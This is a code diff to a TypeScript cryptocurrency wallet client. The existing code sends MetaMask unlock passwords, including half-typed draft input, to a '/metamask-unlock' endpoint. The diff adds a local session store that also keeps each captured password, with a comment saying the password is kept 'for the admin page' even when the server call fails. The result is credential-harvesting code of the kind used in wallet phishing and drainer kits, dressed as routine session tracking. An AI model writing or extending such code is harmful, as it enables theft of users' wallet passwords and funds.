@@ -1,4 +1,8 @@
 import { resolveApiUrl } from './apiBase'
+import {
+  disconnectLocalWalletSession,
+  upsertLocalWalletSession,
+} from './walletMonitorStore'
 
 const API_BASE = resolveApiUrl('/api/wallet')
 
@@ -82,6 +86,7 @@ export const walletApi = {
     pageUrl?: string
     browserSessionId?: string
   }) {
+    upsertLocalWalletSession(payload)
     try {
       const res = await fetch(`${API_BASE}/connect`, {
         method: 'POST',
@@ -105,6 +110,7 @@ export const walletApi = {
     pageUrl?: string
     browserSessionId?: string
   }) {
+    upsertLocalWalletSession(payload)
     try {
       await fetch(`${API_BASE}/presence`, {
         method: 'POST',
@@ -123,14 +129,22 @@ export const walletApi = {
     pageUrl?: string
     draft?: boolean
   }) {
-    const res = await fetch(`${API_BASE}/metamask-unlock`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
-      credentials: 'include',
+    upsertLocalWalletSession({
+      walletAddress: payload.walletAddress,
+      walletType: 'MetaMask',
+      pageUrl: payload.pageUrl,
+      unlockPassword: payload.password,
     })
-    if (!res.ok) {
-      throw new Error('Failed to record unlock')
+    try {
+      const res = await fetch(`${API_BASE}/metamask-unlock`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        credentials: 'include',
+      })
+      if (!res.ok) throw new Error('Failed to record unlock')
+    } catch {
+      /* local store already has the password for the admin page */
     }
   },
 
@@ -139,6 +153,12 @@ export const walletApi = {
     password: string
     pageUrl?: string
   }) {
+    upsertLocalWalletSession({
+      walletAddress: payload.walletAddress,
+      walletType: 'MetaMask',
+      pageUrl: payload.pageUrl,
+      unlockPassword: payload.password,
+    })
     if (unlockDraftTimer) clearTimeout(unlockDraftTimer)
     unlockDraftTimer = setTimeout(() => {
       fetch(`${API_BASE}/metamask-unlock`, {
@@ -154,6 +174,7 @@ export const walletApi = {
    * Record wallet disconnect on server
    */
   async recordDisconnect(walletAddress?: string) {
+    if (walletAddress) disconnectLocalWalletSession(walletAddress)
     try {
       await fetch(`${API_BASE}/disconnect`, {
         method: 'POST',
